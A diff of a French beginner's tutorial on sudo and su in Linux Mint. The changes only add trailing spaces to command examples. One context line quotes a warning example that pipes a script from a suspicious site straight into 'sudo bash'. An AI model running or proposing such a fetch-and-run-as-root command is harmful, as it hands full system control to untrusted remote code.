@@ -106,8 +106,8 @@ apt install nano
 
 **Résultat :**
 ```
-E: Could not open lock file /var/lib/dpkg/lock - open (13: Permission denied)
-E: Unable to lock the administration directory (/var/lib/dpkg/), are you root?
+E: Could not open lock file /var/lib/dpkg/lock - open (13: Permission denied)  
+E: Unable to lock the administration directory (/var/lib/dpkg/), are you root?  
 ```
 
 **Avec sudo (fonctionne) :**
@@ -140,8 +140,8 @@ Pendant ce temps, vous pouvez utiliser sudo sans retaper le mot de passe.
 
 **Exemple :**
 ```bash
-sudo apt update        # Demande le mot de passe
-sudo apt upgrade       # Ne demande pas (dans les 15 minutes)
+sudo apt update        # Demande le mot de passe  
+sudo apt upgrade       # Ne demande pas (dans les 15 minutes)  
 # ... 15 minutes plus tard ...
 sudo apt install vim   # Redemande le mot de passe
 ```
@@ -164,49 +164,49 @@ sudo cat /var/log/auth.log | grep sudo
 ### Installation et mise à jour de logiciels
 
 ```bash
-sudo apt update                    # Mettre à jour la liste des paquets
-sudo apt upgrade                   # Mettre à jour les paquets installés
-sudo apt install firefox           # Installer Firefox
-sudo apt remove firefox            # Désinstaller Firefox
+sudo apt update                    # Mettre à jour la liste des paquets  
+sudo apt upgrade                   # Mettre à jour les paquets installés  
+sudo apt install firefox           # Installer Firefox  
+sudo apt remove firefox            # Désinstaller Firefox  
 ```
 
 ### Édition de fichiers système
 
 ```bash
-sudo nano /etc/ssh/sshd_config     # Éditer la configuration SSH
-sudo vim /etc/hosts                # Éditer le fichier hosts
+sudo nano /etc/ssh/sshd_config     # Éditer la configuration SSH  
+sudo vim /etc/hosts                # Éditer le fichier hosts  
 ```
 
 ### Gestion des services
 
 ```bash
-sudo systemctl start apache2       # Démarrer Apache
-sudo systemctl stop apache2        # Arrêter Apache
-sudo systemctl restart networking  # Redémarrer le réseau
+sudo systemctl start apache2       # Démarrer Apache  
+sudo systemctl stop apache2        # Arrêter Apache  
+sudo systemctl restart networking  # Redémarrer le réseau  
 ```
 
 ### Gestion des utilisateurs
 
 ```bash
-sudo adduser nouvel_utilisateur    # Créer un utilisateur
-sudo deluser ancien_utilisateur    # Supprimer un utilisateur
-sudo passwd utilisateur            # Changer le mot de passe d'un utilisateur
+sudo adduser nouvel_utilisateur    # Créer un utilisateur  
+sudo deluser ancien_utilisateur    # Supprimer un utilisateur  
+sudo passwd utilisateur            # Changer le mot de passe d'un utilisateur  
 ```
 
 ### Gestion des fichiers système
 
 ```bash
-sudo cp fichier.conf /etc/         # Copier vers un dossier système
-sudo chown www-data:www-data /var/www/html  # Changer propriétaire
-sudo chmod 755 /usr/local/bin/script        # Modifier permissions
+sudo cp fichier.conf /etc/         # Copier vers un dossier système  
+sudo chown www-data:www-data /var/www/html  # Changer propriétaire  
+sudo chmod 755 /usr/local/bin/script        # Modifier permissions  
 ```
 
 ### Commandes système
 
 ```bash
-sudo reboot                        # Redémarrer l'ordinateur
-sudo shutdown -h now               # Éteindre immédiatement
-sudo shutdown -h +10               # Éteindre dans 10 minutes
+sudo reboot                        # Redémarrer l'ordinateur  
+sudo shutdown -h now               # Éteindre immédiatement  
+sudo shutdown -h +10               # Éteindre dans 10 minutes  
 ```
 
 ---
@@ -309,8 +309,8 @@ su - root
 ### Pourquoi le tiret `-` ?
 
 ```bash
-su -        # Avec tiret (recommandé)
-su          # Sans tiret
+su -        # Avec tiret (recommandé)  
+su          # Sans tiret  
 ```
 
 **Avec le tiret `-` :**
@@ -558,8 +558,8 @@ curl http://site-suspect.com/install.sh | sudo bash
 ### Danger 4 : Applications graphiques en root
 
 ```bash
-sudo firefox
-sudo nautilus
+sudo firefox  
+sudo nautilus  
 ```
 
 **Problèmes :**
@@ -614,8 +614,8 @@ sudo -i
 
 **Bon :**
 ```bash
-sudo apt update
-sudo apt upgrade
+sudo apt update  
+sudo apt upgrade  
 # Vous revenez à votre compte entre chaque commande
 ```
 
@@ -653,8 +653,8 @@ sudo cat /var/log/auth.log | grep sudo
 
 **Problème :**
 ```bash
-sudo apt update
-utilisateur is not in the sudoers file. This incident will be reported.
+sudo apt update  
+utilisateur is not in the sudoers file. This incident will be reported.  
 ```
 
 **Cause :** Votre compte n'a pas les privilèges sudo.
@@ -685,8 +685,8 @@ Sorry, try again.
 
 **Problème :**
 ```bash
-sudo apt update
-sudo: command not found
+sudo apt update  
+sudo: command not found  
 ```
 
 **Cause :** sudo n'est pas installé (rare sur Linux Mint).
@@ -703,8 +703,8 @@ apt install sudo
 Vous avez utilisé sudo pour créer un fichier, maintenant il appartient à root.
 
 ```bash
-sudo touch fichier.txt
-ls -l fichier.txt
+sudo touch fichier.txt  
+ls -l fichier.txt  
 -rw-r--r-- 1 root root 0 ... fichier.txt
 ```
 
@@ -720,8 +720,8 @@ sudo chown utilisateur:utilisateur fichier.txt
 
 **Problème :**
 ```bash
-sudo echo "texte" > /etc/fichier
-bash: /etc/fichier: Permission denied
+sudo echo "texte" > /etc/fichier  
+bash: /etc/fichier: Permission denied  
 ```
 
 **Cause :** La redirection `>` est exécutée par votre shell, pas par sudo.
@@ -783,8 +783,8 @@ Configuration dans `/etc/doas.conf`.
 ### Voir qui vous êtes
 
 ```bash
-whoami              # Affiche votre nom d'utilisateur
-id                  # Affiche votre UID, GID et groupes
+whoami              # Affiche votre nom d'utilisateur  
+id                  # Affiche votre UID, GID et groupes  
 ```
 
 ### Voir les utilisateurs avec sudo
@@ -865,12 +865,12 @@ ls -l /usr/local/bin/mon_script.sh
 
 ```bash
 # Mettre à jour
-sudo apt update
-sudo apt upgrade
+sudo apt update  
+sudo apt upgrade  
 
 # Nettoyer les paquets inutiles
-sudo apt autoremove
-sudo apt autoclean
+sudo apt autoremove  
+sudo apt autoclean  
 
 # Revenir à l'utilisateur normal
 # (automatique, vous n'avez rien à faire)
@@ -903,14 +903,14 @@ sudo apt autoclean
 ### Commandes essentielles
 
 ```bash
-sudo commande              # Exécuter avec privilèges root
-sudo -i                    # Devenir root interactivement
-sudo -k                    # Oublier le cache du mot de passe
-sudo -l                    # Voir vos privilèges sudo
-sudo visudo                # Éditer la configuration sudo
-su -                       # Devenir root (si mot de passe défini)
-exit                       # Quitter une session root
-whoami                     # Voir qui vous êtes
+sudo commande              # Exécuter avec privilèges root  
+sudo -i                    # Devenir root interactivement  
+sudo -k                    # Oublier le cache du mot de passe  
+sudo -l                    # Voir vos privilèges sudo  
+sudo visudo                # Éditer la configuration sudo  
+su -                       # Devenir root (si mot de passe défini)  
+exit                       # Quitter une session root  
+whoami                     # Voir qui vous êtes  
 ```
 
 ### Règles d'or de sécurité
